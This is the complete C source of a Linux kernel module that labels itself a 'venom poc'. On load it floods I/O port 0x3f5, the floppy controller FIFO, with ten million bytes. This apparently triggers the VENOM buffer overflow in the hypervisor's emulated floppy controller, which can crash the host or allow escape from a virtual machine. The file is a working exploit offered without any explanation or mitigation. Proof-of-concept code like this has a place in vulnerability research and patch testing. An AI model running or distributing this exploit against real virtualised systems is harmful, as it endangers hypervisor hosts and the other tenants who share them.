#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include <linux/io.h>
#define FIFO 0x3f5

static int __init init_venom(void){
    printk(KERN_ALERT "venom poc module inserted!\n");
    int i = 0;
    outb(0x0a,0x3f5);
    for(;i<10000000;i++)
        outb(0x42,0x3f5);
    return 0;
}
static void __exit exit_venom(void){
    printk(KERN_ALERT "venom poc module exited!\n");
}

module_init(init_venom);
module_exit(exit_venom);
MODULE_LICENSE("GPL");
